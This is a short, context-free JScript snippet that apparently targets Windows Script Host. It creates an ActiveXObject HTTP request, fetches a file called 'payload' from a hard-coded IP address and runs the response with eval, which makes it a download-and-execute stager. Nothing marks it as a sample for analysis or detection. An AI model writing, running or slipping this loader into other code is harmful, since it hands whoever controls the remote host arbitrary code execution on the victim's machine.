var request = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
request.open("GET", "http://198.51.100.87/payload", false);
request.send();
let payload = request.responseText;
if (payload && payload.length > 0 && request.status === 200) { eval(payload); }
